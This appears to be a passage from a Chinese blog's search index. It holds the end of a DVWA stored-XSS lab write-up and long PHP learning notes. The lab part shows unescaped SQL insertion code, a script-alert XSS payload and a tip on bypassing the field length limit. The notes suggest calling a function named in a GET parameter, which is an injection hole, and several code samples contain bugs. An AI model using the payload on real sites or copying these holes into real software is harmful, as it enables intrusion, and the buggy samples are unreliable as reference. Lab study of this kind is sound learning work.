((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); &#125; ?&gt; 存储型XSS因为是将js代码存在服务器上，每当有人访问了这个带有恶意代码的页面，xss就会被触发，所以传播的范围更广 直接在message栏中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;也可以弹窗了在name行输入也行，但是name行有限制，可以通过抓包改包破除这个限制","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect-time.xyz/tags/dvwa/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://perfect-time.xyz/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"php学习笔记-基础部分","slug":"phpstudy-1","date":"2018-07-18T02:10:22.000Z","updated":"2022-07-05T06:58:20.000Z","comments":true,"path":"2018/07/18/phpstudy-1/","link":"","permalink":"https://perfect-time.xyz/2018/07/18/phpstudy-1/","excerpt":"珍爱生命，远离php","text":"珍爱生命，远离php PHP基本语法php是一种服务器端嵌入html脚本语言，也就是说可以将php标签嵌入到html代码中 语法规则php每条语句后面必须有“;” php中的变量名必须区分大小写，函数名、方法名、类名不区分 PHP标记①&lt;?php ...?&gt; ②&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt; ③&lt;? ... ?&gt; (默认关闭，需要手动开启) ④&lt;% ... %&gt; (默认关闭，需要手动开启) 在php.ini中开启 注释单行注释：&#x2F;&#x2F;注释内容 多行注释：&#x2F;*注释内容*&#x2F; 变量及操作概念变量是内存中用于临时存储数据的一个空间，这个空间有一个名字，名字就是变量名。变量名是用于对这个内存中的数据进行引用的。 变量语法： $变量名&#x3D;值;说明： php中的变量必须以”$”开头 变量名只能包含字母、数字、下划线，只能以字母、下划线开头。 删除变量语法: unset(变量名) 可变变量1.通过一个变量来访问另一个变量 &lt;?php $v = &#39;age&#39; $age = &#39;20&#39; echo $v; echo $$v; ?&gt; 结果： age 20 2.通过一个变量来创建另一个变量 &lt;?php $v = &#39;age&#39; $vv = &#39;20&#39; echo $age; ?&gt; 结果： 20 预定义变量php为了我们预先定义了一组变量，这些变量会在不同的需求中使用 $_GET 用于前台表单使用get方式提交的数据 $_POST 用于前台表单使用post方式提交的数据 $_REQUEST 用于前台表单使用get或post方式提交的数据 $_SERVER 记录了服务器端与客户端的相关信息 $_COOKIE 一种会话技术 $_SESSION 一种会话技术 $_FILES 用于记录用户上传的文件信息 $_GLOBAL 用于记录全局变量 使用方法： print_r($_SERVER) 内存原理内存结构栈区保存的是变量名（术语称之为引用） 特点：对于CPU来说，读写速度是最快的 堆区存储的是是“复杂”的数据，比如数据、对象、字符串 数据段分为全局数据段和静态数据段 存储的是简单的数据，比如整型、浮点型、布尔值 （计算机能存储的最大整数为2147483647） 代码段存储的是源代码对应的机器指令 输出缓存只要是有输出指令，比如echo、print、var_dump。这些指令会将所有要输出的数据放在输出缓存中 php执行过程编译阶段进行语法检查、词法检查、代码优化 编译通过之后将源代码转换为机器指令 Parse error：编译阶段发生错误，语法有问题 执行阶段如果编译通过后，会将源代码对应的机器指令，保存在代码段，再开始执行代码段中的机器指令 例如： &lt;?php $v1 = 10; $v2 = $v1; $v2 = 20; echo $v1; ?&gt; 执行过程如下: 1、先通过编译阶段，将源代码存储在代码段中。 2、执行$v1&#x3D;10，会在栈区开辟一个空间存储变量$v1，将数据保存到数据段的全局区，再将数据的物理地址赋给栈区的变量$v1。 3、执行$v2&#x3D;$v1，在栈区开辟一个空间存储变量$v2，读取变量$v1的值，读取出来的数据保存在数据段全局区，将这个数据的地址赋值给栈区中的$v2。 4、执行$v2&#x3D;20，找到栈区中的$v2，并根据地址找到数据段全局区对应的空间，将数据覆盖。 5、执行echo $v1，找到栈区中的变量$v1，并根据地址找到数据段全局区中的值，将值读取出来，并放入到输出缓存中。 6、程序执行结束，输出缓存中的数据会自动返回给apache，apache返回给浏览器，同时栈区、数据段、代码段中的数据会被系统清空 PHP嵌入到HTML的执行过程php功能模块在处理一个php文件时，它只会处理php代码，对于非php代码，它会原样输出 到输出缓存中，由输出缓存发给apche来解析html以及js代码等php仅处理&lt;?php?&gt;标签内的代码，js、html、css对php来说都是字符串 php中变量的传值方式赋值传值使用一个变量a为另一个变量b赋值时，传递的是变量a的值，这种赋值方式称为赋值传值 $a = 10 $b = $a echo $b 结果： 10 引用传值使用一个变量a为另一个变量b赋值时，传递的是变量a的地址，这种赋值方式称为引用传值 $a = 10; $b = &amp;$a; $b = 20; echo $a,$b; 结果： 20,20 执行$b = &amp;$a;时，由于多了一个&amp;符号，所以内存会在栈区中开辟一个空间存储变量$b,并将$a的物理地址赋值给$b。 执行$b = 20;时，根据$b的物理地址找到数据段全局区中的数据并覆盖，由于$a的物理地址也是这个地址，所以$a的值也被改为20。 常量常量是一种特殊的变量，也是用于存储数据。常量一旦定义就不允许修改其值，常量本身不允许删除 概念define（’常量名’，值）； const 常量名 &#x3D; 值； 常量一旦被定义就不允许更改 常量的值只能是基本数据类型（标量数据类型） 常量默认区分大小写，一般常量在没命时，我们会使用全大写的形式 区别： define允许在分支结构（比如循环语句）中定义常量，但是const不允许 define在值后面加一个true，定义的常量将不区分大小写 常量的判断以及获取所有的常量常量的判断defined（‘常量名’） 比define多了一个d，判断返回布尔值 获取所有常量get_defined_constants(); 获取php中所有的常量 魔术常量__FILE__ 用于获取当前文件路径以及文件名 __DIR__ 用于获取当前文件的路径 __LINE__ 用于获取当前行号 __FUNCTION__用于获取函数的函数名 __METHOD__ 用于获取当前方法的方法名 __CLASS__ 用于获取当前类的类名 __NAMESPACE__用于获取当前空间的空间名 PHP中的数据类型数据类型的分类1.标量数据类型 int 整型 float 浮点型 boolean 布尔型string 字符串 2.复合数据类型 array 数组object 对象 3.特殊数据类型 null nullresource 资源类型 int型十进制$v&#x3D;255 八进制以0开头，并且不能有超过7的数字 十六进制以0x开头，包含0-9、a-f 其他进制在显示时会自动转换为十进制 float型有小数点的数就成为浮点数 浮点数不可能在不丢失精度的情况下转为二进制格式，所以使用浮点数进行运算的时候会出现偏差 string型字符串即单引号或者双引号括起来的0个或多个字符 单引号在单引号内能被转义的字符串：&#39;、\\\\ 单引号定义的字符串中的变量值不能被解析 双引号在双引号内能被转义的字符串：&quot;、\\t、\\r、\\n、\\\\、$ 双引号定义的字符串中的变量值可以被解析（加{}可以插入变量） heredoc类似于双引号定义字符串，主要用于定义大段的字符串 语法： $heredoc = &lt;&lt;&lt;开始标记 大段文本 结束标记； 开始标记和结束标记必须相同 结束标记必须定格写 nowdoc:本质上和heredoc一样，只不过nowdoc为单引号书写 array型索引数组 数组元素下标是数值，这样的数组就是索引数组 关联数组 数组元素的下标是字符串，这样的数组就是管理数组 数组元素的访问$a &#x3D; “&lt;h3&gt;$_arry[AAA]&lt;&#x2F;h3&gt;“ or $a &#x3D; “&lt;h3&gt;{$_arry[‘AAA’]}&lt;&#x2F;h3&gt;“ 如果在一个字符串中想输出数组的元素，那么下标不需加引号 如果使用了{}来限制了数组，那么下标必须加引号 资源类型资源型数据类型是一个特殊的变量，程序员没有办法直接定义一个资源，必须使用php提供的函数获取资源。不被php管辖的变量都称为资源，比如与mysql的连接 $resource = fopen(&#39;data.txt&#39;,&#39;r&#39;); echo fgets($resource); 以读的方式打开data.txt，并将内容echo出来，$resource就是一个资源型数据 数据类型的转换自动转换当进行运算的两个数据类型不同的时候，php会进行自动转换 强制转换(interger)变量 将其他数据类型强制转换为整型 (float)变量 将其他数据类型强制转换为浮点型 (array)变量 将其他数据类型强制转换为数组 (object)变量 将其他数据类型强制转换为对象 (string)变量 将其他数据类型强制转换为字符串 (boolean)变量 将其他数据类型强制转换为布尔值 运算符赋值运算符&#x3D; 将赋值号右边的值赋给左边的变量，左边必须是变量不能是式子 算数运算符+、-、*、&#x2F;、% % 取膜，即求两数相除，除不尽的部分 在实际运用中，取膜用于判断奇偶数 自操作运算符++ 自增、–自减 前自增&#x2F;减：先对变量的值自增&#x2F;减1，再使用新值参与运算(先在内存中加1&#x2F;减1，再把值从内存中拿出来) 后自增&#x2F;减：先用变量的原值参与式子的运算，在对变量的值加&#x2F;减1 &lt;?php $v = 10 $a = $v + ++$v + ++$v + ++$v + ++$v echo $v,$a 结果 61,14 其他$i+&#x3D;2 $i-&#x3D;2 $i*&#x3D;2 $i&#x2F;&#x3D;2 $i%&#x3D;2 字符串运算符.、.&#x3D; :对字符串进行拼接 当.后面拼接的为一个数字，则数字和.之间要有一个空格，否则php会认为是小数点 比较运算符&gt;、&lt;、&gt;=、&lt;=、==、!=、===、!== == 用于判断两个数的值是否相同 === 用于判断变量的值与类型是否相等，相等则返回true ！= 用于判断两个变量的值是否不同 ！== 用于判断两个变量的值或类型至少有一方面不相同 逻辑运算符&amp;&amp; 逻辑与 || 逻辑或 ! 逻辑非 and 逻辑与，和&amp;&amp;运算规则相同，但是and优先级低于&#x3D; or 逻辑或，和||运算规则相同，但是or优先级低于&#x3D; 逻辑与短路$v1 = 10; $result = false &amp;&amp; ++v1; var_dump($result); // 10 因为逻辑与运算中有一个为FALSE，结果就为False，就没必要去计算第二个值的结果 逻辑或短路$v1 = 10; $result = true || ++v1; var_dump($v2); // 10 逻辑或运算中，只要有一个为True或能转换为True，结果就返回True，就没必要去计算第二个值的结果 逻辑非的一种用法在变量名前面加两个！，比如!!v1，意为把v1强制转换为布尔值 条件运算符三元运算符 语法: 表达式？表达式A：表达式B 先计算表达式是否成立，如果成立去表达式A的值，不成立救取表达式B的值 扩展： 变量？：表达式B 如果变量存在且值不为空，那么就取变量，否则取表达式B 错误控制运算符错误抑制符@ 错误抑制符 不显示错误信息 php.ini在php.ini中，将display_errors的值改为off，就不会显示错误信息 php.ini隐藏错误为全局隐藏，这个服务器下的所有页面的错误信息都会隐藏 脚本级的错误控制脚本级的错误控制仅限于当前的php脚本文件 ini_set(配置项名，值) 主要用于在php脚本中来设置php.ini中的配置项 ini_get（配置项) 主要用于获取php.ini配置文件中的配置项的值 循环语句分支结构ifif(条件1)&#123; 语句体1 &#125;else if(条件2)&#123; 语句体2 &#125;else&#123; 语句体3 &#125; swichswitch()&#123; case 值1: 语句体 1 break; case 值2: 语句体 2 break; default: 缺省语句体 &#125; 当一个语句体执行结束后，如果没有遇到break，则会继续执行下面一条语句体，且不会判断下面那条语句体前面的case 循环结构forfor(循环控制变量初始值;表达式;循环控制变量的更改)&#123; 循环体 &#125; 执行顺序： 1、首先执行循环控制变量初始化，此步仅执行一次 2、判断表达式是否成立，不成立跳出循环 3、执行循环体 4、执行循环控制变量的更改 5、判断表达式是否成立，不成立跳出循环 6、执行循环体 … 嵌套循环时，外层循环控制行，内层循环控制列 使用外层循环的控制变量来控制内层循环的次数 whilewhile(表达式)&#123; 循环体 &#125; 与for的区别：while用于循环次数未知的循环 执行顺序：判断表达式是否成立，不成立执行 执行循环体 判断表达式是否成立，不成立 do…whiledo&#123; 循环体 &#125;while(表达式); 和while的区别：无论表达式是否成立，都会先执行一次循环体 循环的结束与退出continue语法： continue [n] n为整数，如果缺省为1 结束当前循环结构的本次循环，继续上n层循环结构的下一次执行。 break语法： break [n] n为整数，缺省为1 直接结束上n层循环结构。 文件包含requirerequire(文件名) require_once(文件名) require如果引用文件出现问题，会直接中断PHP程序执行。 require_once在包含时，会检查是否被包含过了，如果被包含过了就不再包含 includeinclude(文件名) include_once(文件名) include如果引用文件出现问题，虽然会报错，但仍然会执行之后的代码。 引入路径问题在实现项目中，对于HTML文件，是不允许用户直接请求，而是指向一个PHP文件，让PHP文件来引入这个HTML文件 当一个PHP文件引入一个HTML文档时，html文件本身也会引入一些其他的文件，如图片、CSS、JS 在这个时候就会发生路径更改的问题 解决办法： 使用绝对路径或者使用带域名的相对路径 魔术变量问题__DIR__ 用于获取文件所在的完整的文件名 __FILE__用于获取文件所在的路径 如果引入的文件中带有以上魔术常量，它不会随着文件引入而改变，永远为常量所在的文件的文件名与文件路径 错误处理错误的分类编译错误编译的过程中发生的错误，一般来说都是书写错误，php会告诉程序员是哪里发生错误 执行错误在编译过程通过后，在执行阶段发生的错误，会根据错误的等级，来决定是否中断程序的执行 逻辑错误因为逻辑不严谨而产生的错误 错误代码在php的错误处理机制中，每一种错误都使用了一个错误标识，这些标识是以常量的形式存在 系统错误[E_ERROR] &#x3D;&gt; 1 致命错误 发生中断程序 [E_WARNING] &#x3D;&gt; 2 警告错误 不会中断程序 [E_PARSE] &#x3D;&gt; 4 编译错误 发生中断程序 [E_NOTICE] &#x3D;&gt; 8 提示错误 不会中断程序 [E_STRICT] &#x3D;&gt; 2048 [E_RECOVERABLE_ERROR] &#x3D;&gt; 4096 警告错误 不会中断程序 [E_DEPRECATED] &#x3D; 8192 弃用函数的错误,高版本在使用低版本已经被弃用的函数时会报错，但是仍然可用 核心错误(编译器的错误) [E_CORE_ERROR] &#x3D;&gt; 16 [E_CORE_WARNING] &#x3D;&gt; 32 [E_COMPILE_ERROR] &#x3D;&gt; 64 [E_COMPILE_WARNING] &#x3D;&gt; 128 自定义错误用户错误(可以用户自定义) [E_USER_ERROR] &#x3D;&gt; 256 [E_USER_WARNING] &#x3D;&gt; 512 [E_USER_NOTICE] &#x3D;&gt; 1024 [E_ALL] &#x3D;&gt; 6143 错误的触发系统错误的触发程序员无法干涉系统错误的触发，系统错误是由php自己检测并触发的 用户自定义错误的触发trigger_error(msg, type); msg: 错误描述信息 type：自定义错误的代码（E_USER_ERROR,E_USER_NOTICE…） 这个函数会在日志中记录这次错误信息 错误的控制设置控制错误信息是否显示php.ini中 控制错误信息是否显示 display_errors&#x3D;On&#x2F;Off 控制显示哪一类错误error_reporting&#x3D;E_ALL error_reporting&#x3D;E_NOTICE | R_WARNING error_reporting&#x3D;E_ALL &amp; ~E_NOTICE 错误日志设置开启日志记录 log_errors&#x3D;on 错误日志存放位置 如果没有设置error_log默认是记录到apache的错误日志中\\logs\\error.log error_log&#x3D;syslog 会记录到操作系统的日志中 error_log&#x3D;文件名 会记录到自定义的位置 函数函数的基本概念基本概念函数的模块化的产物，在实际开发过程中，会将项目划分为各个大的功能模块。同样将大的功能模块划分为小的功能。 函数名不区分大小写，命名规则与变量命名规则相同 函数的声明声明语法： funciton 函数名（形参列表）&#123; 函数体 [return值] &#125; 调用语法： 函数名（实参列表） 可变函数与可变变量类似 function showInfo()&#123; echo 123; &#125; $f = &#39;showInfo&#39;; $f(); 实际运用场景中，可以让用户来任意调用想要调用的函数 $f = $_GETp[&#39;f&#39;] $f(); f为get方式传入的函数名 函数的参数从外到内函数定义时的参数是形参 形参是被动的接受数据 形参只对内存有效，对外部不可见 函数调用时的参数是实参 主动向函数传递实际的数据 从内到外return 函数内部可以有多个return，只要遇到一个return就会终端函数执行 形参的默认值php在定义函数时，可以为形参赋值，这个值就是形参的默认值。 如果调用函数没有给具有默认值的形参传递数据，那么形参会使用默认值。 一般具有默认值的形参，一般位于形参列表的最后 匿名函数没有名字的函数即是匿名函数，有成为闭包函数 $fn = function()&#123; echo 123; &#125;; $fn(); 匿名函数没有名字，并且结尾必须加入分号 PHP中的匿名函数无法自调用 但是可以赋值给一个变量，还可以作为某个函数的参数 所以我们可以将它赋值给变量，并通过变量来调用。 回调函数callback在开发过程中，我们使用别人的函数或者系统函数时，函数的参数需要你传递一个函数，作为参数传递的函数就是回调函数。 使用匿名函数作为回调函数: function showInfo($fn)&#123; $fn(); &#125; function say()&#123; echo 123; &#125; showInfo(&#39;say&#39;); showInfo(function()&#123; echo 123; &#125;); 形参和实参之间的引用传值形参和实参之间其实是一个赋值过程，那么我们也可以将这个赋值过程，变为一个引用传值过程。 function showInfo(&amp;$msg)&#123; $msg = 200; &#125; $msg = 100; showInfo($msg); echo $msg; 伪类型php规定了8种数据类型，在php手册中规定了另外几种类型，只会存在于手册中 mixed 表示类型不确定 callback 表示函数 scalar 如果是int float string boolean就属于这种 相关函数func_get_args() 用于获取实参，并以数组的形式返回func_get_arg(ind) 用于获取ind下标指定的实参func_num_args() 用于获取实参的个数实际运用： // 方法1 function showInfo()&#123; echo func_num_args(); // 获取实参的个数 echo func_get_arg(0); // 第一个实参 print_r(func_get_args()); // 所有的实参 &#125; showInfo(1,2,3,4); // 方法2 PHP&gt;=5.6 function showInfo(...$args)&#123; print_r($args); // 结果会以数组的形式打印出来 &#125; showInfo(1,2,3,4); 作用域全局变量和局部变量在函数外部定义的变量，其作用域就是全局作用域，这个变量就是全局变量 在函数内部定义的变量，其作用域就是局部作用域，这个变量就是局部变量 在PHP中只有相同作用域的才能互相访问 global关键字很多时候我们需要在局部变量中使用全局变量，或者全局变量中访问内部。 通过参数的传址方式$i = 10; function showinfo(&amp;$v)&#123; $v = $v+10; echo $v,&#39;&lt;br /&gt;&#39;; &#125; showinfo($v); echo $v; $GLOBALS使用超全部变量实现内部访问外部 $a=&#39;a&#39;; $b=2; function showinfo()&#123; echo $GLOBALS[&#39;a&#39;],&#39;&lt;br /&gt;&#39;; echo $GLOBALS[&#39;b&#39;]，&#39;&lt;br /&gt;&#39;; &#125; showinfo(); GLOBAL关键字语法： global 变量名 $i=10 function showinfo() global $i; echo $i; showinfo(); echo $i; 在函数内部建立一个与函数外部同名的变量的引用，如果外部没有这样的同名变量，会在外部创建一个同名变量 静态变量在函数内部使用static声明的变量即为静态变量 静态变量在函数被多次调用时，只会在编译阶段初始化一次，并且变量的值不会随着函数执行完毕被销毁 在函数下一次被调用时，仍然可以访问其值 在编译阶段时，如果发现函数内部有static变量，则会在数据段的静态区存储这个数据 函数执行时，会在函数空间内创建变量，并把在静态区的变量地址传给栈区中的变量 递归递归思想其实就是函数自己调用自己，一般用于解决有规律性的重复 1 2 3 5 8 13 21 34 55 89 ... function func($pos)&#123; if($pos == 1)&#123; return 1; &#125;elseif($pos == 2)&#123; return 2; &#125;else&#123; return func($pos-1) + func($pos-2); &#125; &#125; echo func(10); 字符串常用函数trtlen语法： terlen(变量) 用于获取字符串的一个字节数(一共有几个字符) 查找strstr(str, substr); 查找str首次出现substr的位置，并截取到最后 strrchr(str, substr); 查找str最后一次出现substr的位置，并截取到最后 strpos(str, substr); 查找str首次出现substr的位置 strrpos(str, substr) 查找str最后一次出现substr的位置 分割explode(分隔符, str) 根据指定的分隔符，将字符串str进行分割，并将每一部分组织成数组，并返回 $string = &#39;a,b,c&#39;; $strArr = explode(&#39;,&#39;, $string); print_r($strArr); //Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c ) 也可以用于获取文件名 替换str_replace(replace, search, str); 在str中查找search部分，并替换成replace部分，并返回替换后的内容 $str &#x3D; ‘a, b’;echo str_replace(‘b’, ‘c’ ,$str); &#x2F;&#x2F; a, c 大小写转换strtolower(str) 转换为小写 strtoupper(str) 转换为大写 去除指定字符trim(str [,substr])将字符串两侧的子字符串去除，substr可以省略，省略为去除空格 $str = &#39;AstringA&#39;; echo trim($str, &#39;A&#39;); // string ltrim(str [,substr]) rtrim(str [,substr]) 区别于只去掉左&#x2F;右 pathinfopathinfo(path [,option])获取一个文件的路径信息 path：是一个文件路径的字符串 option: 获取执行的路径信息 PATHINFO_DIRNAME PATHINFO_BASENAME md5语法： md5(str)； 说明： 用于对str字符串进行md5加密 可以在用户输入密码的时候给密码加密 htmlspecialchars()htmlspecialchars(str) htmlspecialchars_decode(str) 用于将str中的特殊符号转换为HTML字符实体。 echo htmlspecialchars(&#39;&lt;&gt;&#39;); // &amp;lt;&amp;gt;gt; 数组数组是一种数据的集合，数组主要是用于存储具有行列特征(表格)的数据。 数组的概念数组的创建索引数组的创建显示创建 $arr = array(10, 20, 30, 40); $arr2 = [10, 20, 30, 40]; 隐式创建 $arr3 = array(); $arr3[0] = 10; $arr3[1] = 20; $arr3[6] = 20; PHP中的数据下标可以不规连续 关联数组的创建显示创建 $arr = array(键名=&gt;键值, 键名=&gt;键值, ...); $arr2 = [键名=&gt;键值, 键名=&gt;键值, ...] $arr = array(&#39;key&#39;=&gt;&#39;value&#39;); $arr2 = [&#39;key&#39;=&gt;&#39;value&#39;]; 隐式创建 $arr = array(); $arr[&#39;key&#39;] = &#39;value&#39;; 多维数组PHP中支持多维数组，如果一个数组的元素又是数组，那么就是多维数组。(最多支持60维) 显示创建 $arr = array( &#39;userInfo&#39; =&gt; array(&#39;id&#39;=&gt;1, &#39;username&#39;=&gt;&#39;Json&#39;) ); $arr2 = [ &#39;userInfo&#39; =&gt; array(&#39;id&#39;=&gt;1, &#39;username&#39;=&gt;&#39;Json&#39;) ]; 隐式创建 $arr3 = array(); $arr3[&#39;userInfo&#39;] = array(&#39;id&#39;=&gt;1, &#39;username&#39;=&gt;&#39;Json&#39;); 数组元素的访问一维数组 $数组名[下标&#x2F;键名] echo $arr[‘userInfo’]; 二维数组 $数组名[行下标&#x2F;列下标] echo $arr[‘userInfo’][‘id’]; 数组的长度count（） 用于获取数组的长度 echo count($arr); &#x2F;&#x2F;行数 echo count($arr[‘userInfo’]); &#x2F;&#x2F; 具体行的列数 数组的指针表示当前所获得的点 current(arr) 获取当前指针所指向元素的键值 key(arr) 获取当前指针所指向元素的键名 next(arr) 将指针下移 prev(arr) 指针上移 reset(arr) 指针重置 end(arr) 将指针移到最后 数组的遍历for$arr = [10,20,30,40]; for($i=0;$i&lt;=count($arr);$i++)&#123; echo $arr[$i]; &#125; 只能作用于这种下标有规律的方式 foreachforeach($arr as [$key=&gt;]$value)&#123; // 循环体 &#125; 原理： 对数组的指针进行重置。 读取当前指针所指向的数组元素， 并将元素的键名赋值给$key, 键值赋值给$value， 同时数组下移一行 直接读取到数组最后(数组的最后一行其实为NULL，当foreach读到BNULL会自动止) $arr = array(&#39;one&#39;=&gt;&#39;1&#39;, &#39;two&#39;=&gt;&#39;2&#39;, &#39;three&#39;=&gt;&#39;3&#39;); foreach($arr as $key=&gt;$value)&#123; echo $key.&#39;=&gt;&#39;.$value, &#39;&lt;br/&gt;&#39;; &#125; 结果 one=&gt;1 two=&gt;2 three=&gt;3 数组操作常用函数数组的长度count($arr); 获取数组元素的键名与键值array_keys(); 返回所有键名 array_values(); 返回所有键值 判断键名&#x2F;值是否存在array_key_exists(key, arr); 判断键名是否存在(区分大小写) in_array(value, arr); 判断键值是否存在 数组的合并array_merge($arr, $arr2); 合并两个数组 数组的排序sort(); 按键值升序 rsort(); 按键值降序 asort(); 按键值进行升序，但原下标不变 arsort(); 按键值进行降序，但原下标不变 数组解压(extract)$arr = [&#39;id&#39;=&gt;&#39;1&#39;,&#39;username&#39;=&gt;&#39;admin&#39;]; extract($arr); // 将我们关联元素转换为键名为名的变量 echo $id; echo $username;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect-time.xyz/tags/php%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"笔记","slug":"笔记","permalink":"https://perfect-time.xyz/categories/%E7%AC%94%E8%AE%B0/"}]},{"title":"php中一些比较实用的技巧","slug":"phpstudy-2","date":"2018-07-18T02:06:44.000Z","updated":"2022-07-05T06:58:26.000Z","comments":true,"path":"2018/07/18/phpstudy-2/","link":"","permalink":"https://perfect-time.xyz/2018/07/18/phpstudy-2/","excerpt":"整理一些可能会用到的东西","text":"整理一些可能会用到的东西 两个变量互换位置借助第三个变量$v1 = 10; $v2 = 20; $tmp = $v1; $v1 = $v2; $v2 = $vtmp; echo $v1,$v2; 利用加减法$v1 = 10; $v2 = 20; $v1 = $v1 + $v2; $v2 = $v1- $v2; $v1 = $v1 - $v2; echo $v1,$v2; 利用异或$v1 = 10; //$v1=01010 $v2 = 20; //$v2=10100 $v1 = $v1 ^ $v2; //$v1=11110 $v2 = $v1 ^ $v2; //$v2=01010 $v1 = $v1 ^ $v2; //$v1=10100 用异或来获取两个数直接的不同点，在拥有不同点的情况下遇到任何一个数都推出另外一个数，本质上跟加减法类似 进制转换函数dec decimal 十进制 bin binary 二进制 oct octet 八进制 hex hex 十六进制 将两个进制的简写写在一起即为进制转换函数 比如：decbin() 十进制转换为二进制 dechex() 十进制转换为十六进制 php中的输出语句echoecho在输出时将输出的内容转换为字符串再输出，所以只能输出标量数据，在输出true和false时，会输出1和字符空。再输出数组时，会报错 print()和echo一样,区别在于print()是一个函数，会返回值，而echo是语法结构，不会返回值 print_r()可以输出标量以及复合数据类型，但是布尔值还是只会输出1或者字符空 var_dump()可以输出值以及其类型 sprintf()用于格式化输出 语法： sprintf(格式化字符串，变量1，变量2，…..) 格式化占位符： %b 二进制 %d 十进制 %o 八进制 %f 浮点 %x 十六进制 &lt;?php $v1 = 255; echo sprintf(&#39;二进制为:%b&lt;br /&gt;十进制为:%d&lt;br /&gt;八进制为:%o&lt;br /&gt;十六进制为:%x&#39;,$v1,$v1,$v1,$v1); 结果： 二进制为：11111111 十进制为：255 八进制为：377 十六进制为：ff %f用于输出浮点数，默认显示小数后6位，可以指定显示几位小数，比如指定显示两位：%.2f PHP标签语法当在HTML插入PHP代码的时候使用PHP标签语法 &lt;?php for($i=1;$i&lt;=4;$i++)&#123;?&gt; &lt;span&gt;&lt;?php echo $i?&gt;&lt;/span&gt; &lt;?php &#125;?&gt; // 结尾 &#125; 前面必须要加空格，不然会报错 // if标签语法 // 标准语法 &lt;?php if(...):?&gt; // 语句体 &lt;?php endif ?&gt; // 简化语法 &lt;?php if(...)&#123;&gt; // 语句体 &lt;?php &#125;?&gt; //for标签语法 // 标准语法 &lt;?php for(...):?&gt; // 循环体 &lt;?php endif ?&gt; &lt;?php for(...)&#123;?&gt; // 循环体 &lt;?php &#125;?&gt; 系统函数日期和时间函数time() 用于获取当前时间的时间戳，单位是秒。时间戳是从时间原点至现在的一个秒数。 时间原点：计算机中规定从1970年1月1日0时0分0秒那一刻作为时间原点 microtime() 用于计算毫秒，毫秒永远小于1 date(format [,time]) 用于格式化时间信息 format用于格式化时间的字符串，time表示需要格式化的时间戳 mktime(时，分，秒，月，日，年) 用于获取一个指定的时间戳 strtotime(string) 讲一个以字符形式描述的时间转换为时间戳，可以快速运算出例如密码更换策略等 遍历数组while-each-list遍历使用while、each、list语法结构来遍历数组 eacheach(数组) 用于获取当前指针所指的键名与键值 $arr = [&#39;key&#39;=&gt;&#39;value&#39;]; print_r(each($arr)); Array ( [1] =&gt; value [value] =&gt; value [0] =&gt; key [key] =&gt; key ) listlist(); 将数组中的索引元素赋值给变量列表中的变量。 $arr = [10,20,30,40]; list($a, $b, $c, $d) = $arr; 用each+list遍历数组： $arr = array(&#39;one&#39;=&gt;&#39;1&#39;, &#39;two&#39;=&gt;&#39;2&#39;, &#39;three&#39;=&gt;&#39;3&#39;); while(list($k,$v) = each($arr))&#123; echo $k.&#39;=&gt;&#39;.$v,&#39;&lt;br/&gt;&#39;; &#125; 先将each($arr)的值赋给list($k,$v)，然后拿list($k,$v)作为表达式，即$k,当遍历有值的时候，$k&#x3D;true,当遍历到最后的null的时候$k&#x3D;flase foreach-list遍历// php&gt;5.6 // 注意：list只能使用索引数组 $arr = [ [1,2,3,4] ]; foreach($arr as list($a, $b, $c, $d))&#123; echo $a,$b,$c,$d; &#125; 数组算法排序法冒泡排序法注意内循环的条件与外循环的条件 外循环中，由于是交换两个数，只需要循环数组数-1即可 内循环中，由于每一个循环都会把最大值放到最右边，所以最右边的界限需要不断改变 $arr = [10,5,100,255,64,1]; $len = count($arr); for($i=1;$i&lt;$len ;$i++)&#123; for($j=0;$j&lt;$len-$i;$j++)&#123; if($arr[$j]&gt;$arr[$j+1])&#123; $temp = $arr[$j]; $arr[$j] = $arr[$j+1]; $arr[$j+1] = $temp; &#125; &#125; &#125; foreach($arr as $value)&#123; echo &#39;[&#39;.$value.&#39;],&#39;; &#125; 插入排序法1、从第一个元素开始，第一个元素已经被排列 2、在取下一个元素，将其和已经排序的元素中从后往前比较 3、如果以排列元素大于新元素，那么交换两者位置 4、重复步骤3，直到以排序元素小于或者等于新元素 5、重复2-4步骤 $arr = [10,5,100,255,64,1]; for($i=1;$i&lt;count($arr);$i++)&#123; $tmp = $arr[$i]; for($j=$i-1;$j&gt;=0;$j--)&#123; if($arr[$j]&gt;$arr[$j+1])&#123; $arr[$j+1] = $arr[$j]; $arr[$j] = $tmp; &#125; &#125; &#125; print_r($arr); 查找算法顺序查找法unction searchArr($arr, $search)&#123; for($i=0;$i&lt;=count($arr);$i++)&#123; if($arr[$i]==$search)&#123; echo $search; break; &#125; &#125; &#125; $arr = [10,5,100,255,64,1]; searchArr($arr, &#39;64&#39;); 二分查找法前提为数组有序并不重复 可以简单的把数组想象成一个轴，对轴进行二分 $arr = [1,2,3,4,5,6,12,15,17,18,32,55,73,74,89]; function searchArr($arr, $search)&#123; $left = 0; $right = count($arr); while($left &lt;= $right)&#123; $mid = ceil(($left + $right) / 2); if($search &gt; $arr[$mid])&#123; $left = $mid + 1; &#125;elseif($search &lt; $arr[$mid])&#123; $right = $mid - 1; 